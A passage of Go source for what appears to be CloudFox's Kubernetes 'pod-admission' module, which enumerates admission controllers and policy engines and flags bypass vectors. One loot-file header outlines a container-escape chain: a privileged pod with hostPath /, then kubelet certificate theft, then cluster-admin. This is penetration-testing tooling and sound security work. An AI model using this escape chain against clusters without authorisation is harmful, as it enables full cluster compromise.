package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var PodAdmissionCmd = &cobra.Command{
	Use:     "pod-admission",
	Aliases: []string{"psa", "pod-security"},
	Short:   "Analyze pod admission controllers, policies, and security enforcement",
	Long: `
Analyze all cluster pod admission configurations including:
  - Pod Security Standards (PSS) - enforce/warn/audit levels
  - Pod Security Policies (PSP) - deprecated but detected
  - Admission webhooks (mutating/validating) with selector analysis
  - Policy engines (Gatekeeper, Kyverno, Kubewarden, jsPolicy, Polaris, Datree)
  - ValidatingAdmissionPolicy (K8s 1.26+)
  - Gatekeeper mutation policies (Assign, AssignMetadata, ModifySet)
  - Policy exceptions and bypass vectors
  - PSS exemptions analysis

  cloudfox kubernetes pod-admission`,
	Run: ListPodAdmission,
}

// PodSecurityCmd is an alias for backwards compatibility
var PodSecurityCmd = PodAdmissionCmd

type PodAdmissionOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t PodAdmissionOutput) TableFiles() []internal.TableFile { return t.Table }
func (t PodAdmissionOutput) LootFiles() []internal.LootFile   { return t.Loot }

// PodSecurityFinding represents comprehensive policy security analysis for a namespace
type PodSecurityFinding struct {
	// Basic Info
	Namespace string
	Age       string

	// Security Analysis
	RiskLevel      string
	SecurityIssues []string

	// Pod Security Standards (PSS)
	PSSEnabled        bool
	PSSEnforceLevel   string
	PSSEnforceVersion string
	PSSWarnLevel      string
	PSSWarnVersion    string
	PSSAuditLevel     string
	PSSAuditVersion   string
	PSSExemptions     []string

	// Pod Security Policy (PSP - deprecated)
	PSPEnabled           bool
	PSPCount             int
	PSPNames             []string
	ClusterHasPSP        bool
	PSPDeprecationRisk   string
	PSPAllowsPrivileged  bool
	PSPAllowsHostNetwork bool
	PSPAllowsHostPID     bool
	PSPAllowsHostIPC     bool
	PSPAllowsHostPath    bool
	PSPDangerousCaps     []string
	PSPAllowsRunAsRoot   bool

	// Admission Control Webhooks
	MutatingWebhooks   []WebhookInfo
	ValidatingWebhooks []WebhookInfo
	WebhookCount       int
	WebhookBypassRisk  string

	// Dynamic Policy Engines
	GatekeeperPolicies []string
	KyvernoPolicies    []string
	PolicyEngineCount  int

	// Policy Engine Counts (for table display)
	VAPCount                     int
	GatekeeperCount              int
	GatekeeperExcludedNamespaces []string // Bypass vector - namespaces excluded from Gatekeeper
	KyvernoCount                 int
	KyvernoExceptions            int
	KubewardenCount              int
	JsPolicyCount                int
	PolarisEnabled               bool
	DatreeEnabled                bool
	GatekeeperMutationCount      int

	// PSS Exemptions (bypass vectors)
	PSSExemptNamespace      bool // Is this namespace exempt from PSS?
	PSSExemptUsers          []string
	PSSExemptRuntimeClasses []string

	// Webhook Selector Bypasses
	WebhookSelectorBypasses []string // Methods to bypass via selectors

	// Policy Engine Blocking (prevents false positives)
	PolicyEngineBlocks PolicyEngineBlocking

	// Cloud Workload Identity
	CloudIdentity CloudWorkloadIdentityInfo

	// Policy Gaps
	NoEnforcement       bool
	WeakEnforcement     bool
	PolicyGaps          []string
	EnforcementCoverage string

	// Policy Conflicts
	HasConflicts    bool
	ConflictDetails []string
	ConflictRisk    string

	// Policy Bypass Techniques
	BypassTechniques []string
	BypassRisk       string

	// Attack Vectors
	AllowsPrivilegeEscalation bool
	EscalationPaths           []string

	// Recommendations
	Recommendations []string
}

// WebhookInfo represents webhook configuration details
type WebhookInfo struct {
	Name              string
	Type              string // mutating or validating
	FailurePolicy     string
	MatchPolicy       string
	SideEffects       string
	TimeoutSeconds    int32
	NamespaceSelector string
	HasExclusions     bool
	BypassRisk        string
	SecurityIssues    []string
}

// PSPAnalysis represents Pod Security Policy analysis
type PSPAnalysis struct {
	Name                string
	RiskLevel           string
	AllowsPrivileged    bool
	AllowsHostNetwork   bool
	AllowsHostPID       bool
	AllowsHostIPC       bool
	AllowsHostPath      bool
	AllowedHostPaths    []string
	AllowedCapabilities []string
	AllowsRunAsRoot     bool
	RunAsUserRule       string
	SELinuxRule         string
	FSGroupRule         string
	SecurityIssues      []string
	DeprecationWarning  string
}

// PSSAnalysis represents Pod Security Standards analysis
type PSSAnalysis struct {
	EnforceLevel    string
	EnforceVersion  string
	WarnLevel       string
	WarnVersion     string
	AuditLevel      string
	AuditVersion    string
	IsExempt        bool
	ExemptReason    string
	NoEnforcement   bool
	WeakEnforcement bool
	RiskLevel       string
	SecurityIssues  []string
}

// PolicyEscalationPath represents privilege escalation via policy misconfiguration
type PolicyEscalationPath struct {
	Type      string
	Policy    string
	Steps     []string
	EndResult string
	RiskLevel string
}

// CloudWorkloadIdentityInfo tracks cloud provider workload identity configurations
type CloudWorkloadIdentityInfo struct {
	// AWS EKS Pod Identity
	AWSPodIdentityCount       int
	AWSPodIdentityAssociations []AWSPodIdentityAssociation

	// GCP Workload Identity
	GCPWorkloadIdentityEnabled bool
	GCPWorkloadIdentityCount   int
	GCPServiceAccounts         []GCPWorkloadIdentityBinding

	// Azure Workload Identity
	AzureWorkloadIdentityCount int
	AzureIdentities            []AzureWorkloadIdentity
}

// AWSPodIdentityAssociation represents AWS EKS Pod Identity Association
type AWSPodIdentityAssociation struct {
	Name             string
	Namespace        string
	ServiceAccount   string
	RoleARN          string
	HasWildcard      bool // Security concern if SA name is "*"
}

// GCPWorkloadIdentityBinding represents GCP Workload Identity configuration
type GCPWorkloadIdentityBinding struct {
	Name               string
	Namespace          string
	KSAName            string // Kubernetes Service Account
	GSAEmail           string // GCP Service Account email
	AnnotationPresent  bool
}

// AzureWorkloadIdentity represents Azure Workload Identity (AAD Pod Identity)
type AzureWorkloadIdentity struct {
	Name             string
	Namespace        string
	Kind             string // AzureIdentity, AzureIdentityBinding, ServiceAccount (federated)
	ClientID         string
	TenantID         string
	Selector         string
	HasFederated     bool // New federated identity vs legacy AAD Pod Identity
}

// ValidatingAdmissionPolicyInfo represents a ValidatingAdmissionPolicy (K8s 1.26+)
type ValidatingAdmissionPolicyInfo struct {
	Name             string
	FailurePolicy    string
	MatchResources   string
	Validations      int
	AuditAnnotations int
	ParamKind        string
	Bindings         []string
	// CEL expressions for blocking detection
	CELExpressions []string
}

// GatekeeperConstraintInfo represents an OPA Gatekeeper constraint
type GatekeeperConstraintInfo struct {
	Name              string
	Kind              string // The constraint template kind
	EnforcementAction string // deny, dryrun, warn
	Match             string // What resources it matches
	Violations        int
	Parameters        map[string]interface{}
	// Rego content from the associated ConstraintTemplate (for blocking detection)
	RegoContent string
}

// GatekeeperTemplateInfo represents an OPA Gatekeeper ConstraintTemplate
type GatekeeperTemplateInfo struct {
	Name        string
	Kind        string // The CRD kind it creates
	Description string
	Targets     []string
	// Rego policy code for content-based blocking detection
	RegoContent string
}

// KyvernoPolicyInfo represents a Kyverno policy
type KyvernoPolicyInfo struct {
	Name              string
	Namespace         string // empty for ClusterPolicy
	IsClusterPolicy   bool
	ValidationFailure string // enforce, audit
	Background        bool
	Rules             int
	RuleNames         []string
	// Rule patterns for blocking detection (extracted from validate.pattern and validate.deny)
	RulePatterns []string
}

// KyvernoExceptionInfo represents a Kyverno PolicyException (bypass vector!)
type KyvernoExceptionInfo struct {
	Name      string
	Namespace string
	Policies  []string // Which policies are exempted
	Rules     []string // Which rules are exempted
	Match     string   // What resources are exempted
}

// KubewardenPolicyInfo represents a Kubewarden policy
type KubewardenPolicyInfo struct {
	Name            string
	Namespace       string // empty for ClusterAdmissionPolicy
	IsClusterPolicy bool
	Module          string // The WASM module URL
	Mode            string // protect, monitor
	Mutating        bool
	Rules           string
	// Settings for content-based blocking detection (JSON stringified)
	Settings string
}

// GatekeeperConfigInfo represents Gatekeeper Config with namespace exclusions
type GatekeeperConfigInfo struct {
	Name               string
	ExcludedNamespaces []string
	ExemptImages       []string
}

// JsPolicyInfo represents a jsPolicy policy
type JsPolicyInfo struct {
	Name            string
	Namespace       string // empty for ClusterJsPolicy
	IsClusterPolicy bool
	Type            string // Validating, Mutating, Controller
	Operations      []string
	Resources       []string
	ViolationPolicy string // deny, warn
	// JavaScript/TypeScript code for content-based blocking detection
	JavaScriptCode string
}

// PolarisConfigInfo represents Polaris configuration
type PolarisConfigInfo struct {
	WebhookEnabled bool
	ConfigMap      string
	Namespace      string
	Checks         int
	Exemptions     int
	// Specific check configurations for content-based blocking detection
	PrivilegedCheckEnabled   bool
	HostNetworkCheckEnabled  bool
	HostPIDCheckEnabled      bool
	HostIPCCheckEnabled      bool
	CapabilitiesCheckEnabled bool
	RunAsRootCheckEnabled    bool
	HostPathCheckEnabled     bool
	// Raw config for additional parsing
	ConfigContent string
	ImageVerified bool // True if Polaris controller image was verified
}

// DatreeConfigInfo represents Datree webhook configuration
type DatreeConfigInfo struct {
	WebhookEnabled bool
	WebhookName    string
	// Specific check configurations for content-based blocking detection
	PrivilegedCheckEnabled   bool
	HostNetworkCheckEnabled  bool
	HostPIDCheckEnabled      bool
	HostIPCCheckEnabled      bool
	CapabilitiesCheckEnabled bool
	RunAsRootCheckEnabled    bool
	HostPathCheckEnabled     bool
	// Raw config content for additional parsing
	ConfigContent string
	ImageVerified bool // True if Datree controller image was verified
}

// PSSExemptionInfo represents PSS exemptions from AdmissionConfiguration
type PSSExemptionInfo struct {
	ExemptUsernames      []string
	ExemptRuntimeClasses []string
	ExemptNamespaces     []string
}

// GatekeeperMutationInfo represents Gatekeeper mutation policies
type GatekeeperMutationInfo struct {
	Name       string
	Kind       string // Assign, AssignMetadata, ModifySet
	Location   string // What field is being mutated
	Parameters string
	Match      string
}

// WebhookSelectorInfo represents detailed webhook selector analysis
type WebhookSelectorInfo struct {
	WebhookName       string
	Type              string // mutating, validating
	NamespaceSelector string
	ObjectSelector    string
	ExcludedLabels    []string
	MatchLabels       map[string]string
	BypassMethod      string
}

// verifyPodAdmissionImage checks if an image matches known patterns for the specified engine
// Now uses the shared admission SDK for centralized engine detection
func verifyPodAdmissionImage(image string, engine string) bool {
	return VerifyControllerImage(image, engine)
}

// PolicyEngineBlocking tracks which dangerous capabilities are blocked by policy engines
// This prevents false positives when PSS is not configured but policy engines enforce restrictions
type PolicyEngineBlocking struct {
	PrivilegedBlocked      bool
	PrivilegedBlockedBy    []string
	HostPathBlocked        bool
	HostPathBlockedBy      []string
	HostNetworkBlocked     bool
	HostNetworkBlockedBy   []string
	HostPIDBlocked         bool
	HostPIDBlockedBy       []string
	HostIPCBlocked         bool
	HostIPCBlockedBy       []string
	DangerousCapsBlocked   bool
	DangerousCapsBlockedBy []string
	RunAsRootBlocked       bool
	RunAsRootBlockedBy     []string
}

func ListPodAdmission(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithTimeout()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Analyzing pod security policies for %s", globals.ClusterName), globals.K8S_POD_SECURITY_MODULE_NAME)

	clientset := config.GetClientOrExit()
	dynClient := config.GetDynamicClientOrExit()

	// Detect cluster-wide PSP
	clusterHasPSP := false
	pspAnalyses := analyzePSPs(ctx, dynClient)
	if len(pspAnalyses) > 0 {
		clusterHasPSP = true
	}

	// Get namespaces
	namespaces := shared.GetTargetNamespaces(ctx, clientset, &logger, globals.K8S_POD_SECURITY_MODULE_NAME)

	// Analyze webhooks
	mutatingWebhooks := analyzeWebhooks(ctx, dynClient, "mutatingwebhookconfigurations")
	validatingWebhooks := analyzeWebhooks(ctx, dynClient, "validatingwebhookconfigurations")

	// Analyze ValidatingAdmissionPolicy (K8s 1.26+)
	vapPolicies := analyzeValidatingAdmissionPolicies(ctx, dynClient)

	// Analyze OPA Gatekeeper
	gatekeeperTemplates, gatekeeperConstraints := analyzeGatekeeperConstraints(ctx, dynClient)

	// Analyze Kyverno
	kyvernoPolicies, kyvernoExceptions := analyzeKyvernoPolicies(ctx, dynClient)

	// Analyze Kubewarden
	kubewardenPolicies := analyzeKubewardenPolicies(ctx, dynClient)

	// Analyze Gatekeeper Config (namespace exclusions - bypass vector)
	gatekeeperConfig := analyzeGatekeeperConfig(ctx, dynClient)

	// Analyze jsPolicy
	jsPolicies := analyzeJsPolicies(ctx, dynClient)

	// Analyze Polaris
	polarisConfig := analyzePolarisConfig(ctx, clientset, dynClient)

	// Analyze Datree
	datreeConfig := analyzeDatreeConfig(ctx, clientset, dynClient)

	// Analyze Cloud Workload Identity (AWS, GCP, Azure)
	logger.InfoM("Analyzing cloud workload identity configurations...", globals.K8S_POD_SECURITY_MODULE_NAME)
	awsPodIdentities := analyzeAWSPodIdentity(ctx, dynClient)
	gcpWorkloadIdentities := analyzeGCPWorkloadIdentity(ctx, clientset)
	azureWorkloadIdentities := analyzeAzureWorkloadIdentity(ctx, dynClient)

	// Analyze Gatekeeper Mutation policies (Assign, AssignMetadata, ModifySet)
	gatekeeperMutations := analyzeGatekeeperMutation(ctx, dynClient)

	// Analyze webhook selectors for bypass opportunities
	webhookSelectors := analyzeWebhookSelectors(ctx, dynClient)

	// Analyze PSS exemptions (from namespace annotations or cluster config)
	pssExemptions := analyzePSSExemptions(ctx, clientset)

	// Detect policy engine blocking for dangerous capabilities (prevents false positives)
	policyEngineBlocking := detectPolicyEngineBlocking(
		gatekeeperConstraints, kyvernoPolicies, vapPolicies, kubewardenPolicies,
		jsPolicies, polarisConfig, datreeConfig,
	)

	// Legacy dynamic policy detection (for backwards compatibility)
	_ = gatekeeperTemplates // used for detail table

	// Process each namespace
	var findings []PodSecurityFinding

	for _, ns := range namespaces {
		// Get namespace object to access labels and metadata
		nsObj, err := clientset.CoreV1().Namespaces().Get(ctx, ns, metav1.GetOptions{})
		if err != nil {
			shared.LogGetError(&logger, "namespace", ns, err, globals.K8S_POD_SECURITY_MODULE_NAME, false)
			continue
		}

		finding := PodSecurityFinding{
			Namespace:     ns,
			ClusterHasPSP: clusterHasPSP,
		}

		// Calculate age
		age := time.Since(nsObj.CreationTimestamp.Time)
		finding.Age = podSecurityFormatDuration(age)

		// PSS Analysis
		pssAnalysis := analyzePodSecurityStandards(*nsObj)
		finding.PSSEnabled = !pssAnalysis.NoEnforcement
		finding.PSSEnforceLevel = pssAnalysis.EnforceLevel
		finding.PSSEnforceVersion = pssAnalysis.EnforceVersion
		finding.PSSWarnLevel = pssAnalysis.WarnLevel
		finding.PSSWarnVersion = pssAnalysis.WarnVersion
		finding.PSSAuditLevel = pssAnalysis.AuditLevel
		finding.PSSAuditVersion = pssAnalysis.AuditVersion
		finding.NoEnforcement = pssAnalysis.NoEnforcement
		finding.WeakEnforcement = pssAnalysis.WeakEnforcement
		finding.SecurityIssues = append(finding.SecurityIssues, pssAnalysis.SecurityIssues...)

		// PSP Analysis
		if clusterHasPSP {
			finding.PSPEnabled = true
			finding.PSPCount = len(pspAnalyses)
			for _, psp := range pspAnalyses {
				finding.PSPNames = append(finding.PSPNames, psp.Name)
				if psp.AllowsPrivileged {
					finding.PSPAllowsPrivileged = true
				}
				if psp.AllowsHostNetwork {
					finding.PSPAllowsHostNetwork = true
				}
				if psp.AllowsHostPID {
					finding.PSPAllowsHostPID = true
				}
				if psp.AllowsHostIPC {
					finding.PSPAllowsHostIPC = true
				}
				if psp.AllowsHostPath {
					finding.PSPAllowsHostPath = true
				}
				finding.PSPDangerousCaps = append(finding.PSPDangerousCaps, psp.AllowedCapabilities...)
				if psp.AllowsRunAsRoot {
					finding.PSPAllowsRunAsRoot = true
				}
			}
			finding.PSPDeprecationRisk = shared.RiskHigh
			finding.SecurityIssues = append(finding.SecurityIssues,
				"PSP is deprecated since Kubernetes 1.21 and removed in 1.25 - migrate to PSS")
		}

		// Webhook Analysis
		finding.MutatingWebhooks = filterWebhooksForNamespace(mutatingWebhooks, ns, nsObj.Labels)
		finding.ValidatingWebhooks = filterWebhooksForNamespace(validatingWebhooks, ns, nsObj.Labels)
		finding.WebhookCount = len(finding.MutatingWebhooks) + len(finding.ValidatingWebhooks)

		for _, wh := range finding.MutatingWebhooks {
			finding.SecurityIssues = append(finding.SecurityIssues, wh.SecurityIssues...)
			if wh.BypassRisk == shared.RiskHigh {
				finding.WebhookBypassRisk = shared.RiskHigh
			}
		}
		for _, wh := range finding.ValidatingWebhooks {
			finding.SecurityIssues = append(finding.SecurityIssues, wh.SecurityIssues...)
			if wh.BypassRisk == shared.RiskHigh {
				finding.WebhookBypassRisk = shared.RiskHigh
			}
		}

		// Policy Engine Counts
		finding.VAPCount = len(vapPolicies)
		finding.GatekeeperCount = len(gatekeeperConstraints)
		finding.GatekeeperExcludedNamespaces = gatekeeperConfig.ExcludedNamespaces
		finding.KyvernoCount = len(kyvernoPolicies)
		finding.KyvernoExceptions = len(kyvernoExceptions)
		finding.KubewardenCount = len(kubewardenPolicies)
		finding.JsPolicyCount = len(jsPolicies)
		finding.PolarisEnabled = polarisConfig.WebhookEnabled
		finding.DatreeEnabled = datreeConfig.WebhookEnabled
		finding.PolicyEngineCount = finding.VAPCount + finding.GatekeeperCount + finding.KyvernoCount + finding.KubewardenCount + finding.JsPolicyCount
		if finding.PolarisEnabled {
			finding.PolicyEngineCount++
		}
		if finding.DatreeEnabled {
			finding.PolicyEngineCount++
		}

		// Gatekeeper Mutation count
		finding.GatekeeperMutationCount = len(gatekeeperMutations)

		// Policy Engine Blocking (for accurate column display)
		finding.PolicyEngineBlocks = policyEngineBlocking

		// Cloud Workload Identity (filtered by namespace)
		finding.CloudIdentity = CloudWorkloadIdentityInfo{
			AWSPodIdentityCount:        len(filterAWSPodIdentitiesByNamespace(awsPodIdentities, ns)),
			AWSPodIdentityAssociations: filterAWSPodIdentitiesByNamespace(awsPodIdentities, ns),
			GCPWorkloadIdentityCount:   len(filterGCPWorkloadIdentitiesByNamespace(gcpWorkloadIdentities, ns)),
			GCPServiceAccounts:         filterGCPWorkloadIdentitiesByNamespace(gcpWorkloadIdentities, ns),
			AzureWorkloadIdentityCount: len(filterAzureWorkloadIdentitiesByNamespace(azureWorkloadIdentities, ns)),
			AzureIdentities:            filterAzureWorkloadIdentitiesByNamespace(azureWorkloadIdentities, ns),
		}
		// Check if any GCP workload identity is enabled
		if len(finding.CloudIdentity.GCPServiceAccounts) > 0 {
			finding.CloudIdentity.GCPWorkloadIdentityEnabled = true
		}

		// PSS Exemptions check
		for _, exemptNs := range pssExemptions.ExemptNamespaces {
			if exemptNs == ns {
				finding.PSSExemptNamespace = true
				finding.SecurityIssues = append(finding.SecurityIssues,
					"Namespace is exempt from PSS enforcement")
				break
			}
		}
		finding.PSSExemptUsers = pssExemptions.ExemptUsernames
		finding.PSSExemptRuntimeClasses = pssExemptions.ExemptRuntimeClasses

		// Webhook selector bypasses
		for _, ws := range webhookSelectors {
			if ws.BypassMethod != "" {
				finding.WebhookSelectorBypasses = append(finding.WebhookSelectorBypasses, ws.BypassMethod)
			}
		}

		// Policy Gap Detection
		finding.PolicyGaps = detectPolicyGaps(finding)
		if finding.NoEnforcement {
			finding.EnforcementCoverage = "None"
		} else if finding.WeakEnforcement {
			finding.EnforcementCoverage = "Weak"
		} else {
			finding.EnforcementCoverage = "Strong"
		}

		// Policy Conflict Detection
		finding.ConflictDetails = detectPolicyConflicts(finding)
		finding.HasConflicts = len(finding.ConflictDetails) > 0
		if finding.HasConflicts {
			finding.ConflictRisk = shared.RiskMedium
		}

		// Policy Bypass Detection
		finding.BypassTechniques = detectPolicyBypass(finding)
		if len(finding.BypassTechniques) > 0 {
			finding.BypassRisk = shared.RiskHigh
		}

		// Escalation Path Detection
		finding.EscalationPaths = detectPolicyEscalationPaths(finding, pspAnalyses)
		finding.AllowsPrivilegeEscalation = len(finding.EscalationPaths) > 0

		// Risk Scoring
		finding.RiskLevel, _ = calculatePolicyRiskScore(finding)

		// Recommendations
		finding.Recommendations = generatePolicyRecommendations(finding)

		findings = append(findings, finding)
	}

	// Generate output - Main table: Namespace Security Summary
	headers := []string{
		"Namespace",
		"PSS Enforce",
		"PSS Warn",
		"PSS Audit",
		"PSP Enabled",
		"Privileged",
		"HostPath",
		"HostNetwork",
		"HostPID",
		"Dangerous Caps",
		"Webhooks",
		"Webhook Bypass",
		"Policy Engines",
		"Policy Exceptions",
		"Age",
	}

	// Webhooks detail table
	webhookHeaders := []string{
		"Webhook Name",
		"Type",
		"Failure Policy",
		"Timeout",
		"Namespace Selector",
		"Side Effects",
		"Bypass Risk",
	}

	// PSP detail table
	pspHeaders := []string{
		"PSP Name",
		"Privileged",
		"HostNetwork",
		"HostPID",
		"HostIPC",
		"HostPath",
		"Dangerous Caps",
		"Run As Root",
	}

	// ValidatingAdmissionPolicy detail table
	vapHeaders := []string{
		"Policy Name",
		"Failure Policy",
		"Validations",
		"Param Kind",
		"Bindings",
	}

	// Gatekeeper Constraints detail table
	gatekeeperHeaders := []string{
		"Constraint Name",
		"Template Kind",
		"Enforcement",
		"Match",
		"Violations",
	}

	// Kyverno Policies detail table
	kyvernoHeaders := []string{
		"Policy Name",
		"Scope",
		"Namespace",
		"Failure Action",
		"Rules",
		"Background",
	}

	// Kyverno Exceptions detail table (bypass vectors!)
	kyvernoExceptionHeaders := []string{
		"Exception Name",
		"Namespace",
		"Exempted Policies",
		"Exempted Rules",
		"Match",
	}

	// Kubewarden Policies detail table
	kubewardenHeaders := []string{
		"Policy Name",
		"Scope",
		"Namespace",
		"Module",
		"Mode",
		"Mutating",
		"Rules",
	}

	// jsPolicy Policies detail table
	jsPolicyHeaders := []string{
		"Policy Name",
		"Scope",
		"Namespace",
		"Type",
		"Operations",
		"Resources",
		"Violation Policy",
	}

	// Gatekeeper Exclusions detail table (bypass vectors!)
	gatekeeperExclusionHeaders := []string{
		"Excluded Namespace",
		"Reason",
	}

	var outputRows [][]string
	var webhookRows [][]string
	var pspRows [][]string
	var vapRows [][]string
	var gatekeeperRows [][]string
	var gatekeeperExclusionRows [][]string
	var kyvernoRows [][]string
	var kyvernoExceptionRows [][]string
	var kubewardenRows [][]string
	var jsPolicyRows [][]string
	loot := shared.NewLootBuilder()

	// Initialize loot sections (8 files by technology)
	loot.Section("PSS").SetHeader(`#####################################
##### Pod Security Standards (PSS)
#####################################
#
# PSS is the modern pod security mechanism (Kubernetes 1.23+)
# Levels: privileged (no restrictions), baseline (minimal), restricted (hardened)
#
# Includes:
# - PSS enumeration commands
# - Bypass techniques for weak/missing enforcement
# - Privileged pod deployment for container escape
#`)

	loot.Section("PSP").SetHeader(`#####################################
##### Pod Security Policies (PSP) - DEPRECATED
#####################################
#
# WARNING: PSP is deprecated since Kubernetes 1.21
# REMOVED in Kubernetes 1.25 - migrate to PSS
#
# Includes:
# - PSP enumeration and analysis
# - PSP exploitation techniques
# - Service account to PSP binding analysis
#`)

	loot.Section("Webhooks").SetHeader(`#####################################
##### Admission Webhooks
#####################################
#
# Mutating and Validating admission webhooks
# Risk: failurePolicy=Ignore allows bypass when webhook fails
#
# Includes:
# - Webhook enumeration
# - Bypass techniques (trigger failures)
# - Namespace exclusion analysis
#`)

	loot.Section("VAP").SetHeader(`#####################################
##### ValidatingAdmissionPolicy (K8s 1.26+)
#####################################
#
# Built-in CEL-based policy engine - no webhooks needed
# Faster and more reliable than webhook-based policies
#
# Includes:
# - VAP enumeration
# - VAP binding analysis
# - Bypass techniques
#`)

	loot.Section("Gatekeeper").SetHeader(`#####################################
##### OPA Gatekeeper
#####################################
#
# Open Policy Agent for Kubernetes
# Uses Rego policy language via ConstraintTemplates
#
# Includes:
# - ConstraintTemplate enumeration
# - Constraint enumeration
# - Enforcement action analysis (deny/dryrun/warn)
# - Violation counts
#`)

	loot.Section("Kyverno").SetHeader(`#####################################
##### Kyverno
#####################################
#
# Kubernetes-native policy engine
# Uses YAML-based policies (no new language)
#
# IMPORTANT: Check PolicyExceptions - these are bypass vectors!
#
# Includes:
# - ClusterPolicy enumeration
# - Policy enumeration (namespace-scoped)
# - PolicyException enumeration (BYPASS VECTORS)
# - Enforcement action analysis
#`)

	loot.Section("Kubewarden").SetHeader(`#####################################
##### Kubewarden
#####################################
#
# WebAssembly-based policy engine
# Policies are WASM modules
#
# Includes:
# - ClusterAdmissionPolicy enumeration
# - AdmissionPolicy enumeration
# - Mode analysis (protect/monitor)
#`)

	loot.Section("jsPolicy").SetHeader(`#####################################
##### jsPolicy
#####################################
#
# JavaScript/TypeScript-based policy engine
# Uses familiar JS syntax for policies
#
# Includes:
# - ClusterJsPolicy enumeration
# - JsPolicy enumeration (namespace-scoped)
# - Policy type analysis (Validating/Mutating/Controller)
#`)

	loot.Section("Polaris").SetHeader(`#####################################
##### Polaris
#####################################
#
# Kubernetes best practices validation (Fairwinds)
# Checks for security, efficiency, and reliability
#
# Includes:
# - Webhook detection
# - Configuration analysis
# - Exemption enumeration
#`)

	loot.Section("Datree").SetHeader(`#####################################
##### Datree
#####################################
#
# Policy-as-code admission controller
# Validates Kubernetes manifests against policies
#
# Includes:
# - Webhook detection
# - Policy configuration
#`)

	loot.Section("Privileged-Pods").SetHeader(`#####################################
##### Privileged Pod Deployment
#####################################
#
# Ready-to-use privileged pod YAMLs for vulnerable namespaces
# Use these to deploy container escape pods
#
# Attack chain:
# 1. Deploy privileged pod with hostPath: /
# 2. Exec into pod
# 3. Access /host for full node filesystem
# 4. Steal kubelet certs, escalate to cluster-admin
#`)

	if globals.KubeContext != "" {
		loot.Section("PSS").Addf("kubectl config use-context %s\n", globals.KubeContext)
	}

	for _, finding := range findings {
		// PSS Enforce
		pssEnforce := finding.PSSEnforceLevel
		if pssEnforce == "" {
			pssEnforce = "<NONE>"
		}

		// PSS Warn
		pssWarn := finding.PSSWarnLevel
		if pssWarn == "" {
			pssWarn = "<NONE>"
		}

		// PSS Audit
		pssAudit := finding.PSSAuditLevel
		if pssAudit == "" {
			pssAudit = "<NONE>"
		}

		// PSP Enabled
		pspEnabled := "No"
		if finding.ClusterHasPSP {
			pspEnabled = "Yes"
		}

		// Privileged allowed - check all blocking sources to avoid false positives
		// Priority: Policy Engine > PSS > PSP > No Enforcement
		privilegedAllowed := "Yes"
		if finding.PolicyEngineBlocks.PrivilegedBlocked {
			privilegedAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.PrivilegedBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			privilegedAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsPrivileged {
			privilegedAllowed = "No"
		}

		// HostPath allowed - blocked by baseline and restricted
		hostPathAllowed := "Yes"
		if finding.PolicyEngineBlocks.HostPathBlocked {
			hostPathAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.HostPathBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			hostPathAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsHostPath {
			hostPathAllowed = "No"
		}

		// HostNetwork allowed - blocked by baseline and restricted
		hostNetworkAllowed := "Yes"
		if finding.PolicyEngineBlocks.HostNetworkBlocked {
			hostNetworkAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.HostNetworkBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			hostNetworkAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsHostNetwork {
			hostNetworkAllowed = "No"
		}

		// HostPID allowed - blocked by baseline and restricted
		hostPIDAllowed := "Yes"
		if finding.PolicyEngineBlocks.HostPIDBlocked {
			hostPIDAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.HostPIDBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			hostPIDAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsHostPID {
			hostPIDAllowed = "No"
		}

		// Dangerous Caps - show actual caps or blocked status
		// Note: baseline blocks some caps, restricted blocks more
		dangerousCaps := "ALL (no restriction)"
		if finding.PolicyEngineBlocks.DangerousCapsBlocked {
			dangerousCaps = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.DangerousCapsBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "restricted" {
			dangerousCaps = "Blocked by PSS:restricted"
		} else if finding.PSSEnforceLevel == "baseline" {
			dangerousCaps = "Limited by PSS:baseline"
		} else if len(finding.PSPDangerousCaps) > 0 {
			dangerousCaps = strings.Join(finding.PSPDangerousCaps, ", ")
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" {
			dangerousCaps = "No"
		}

		// Webhook bypass risk - show the reason
		webhookBypass := "<NONE>"
		if finding.WebhookBypassRisk == shared.RiskHigh {
			// Collect bypass reasons
			var bypassReasons []string
			for _, wh := range finding.MutatingWebhooks {
				if wh.FailurePolicy == "Ignore" {
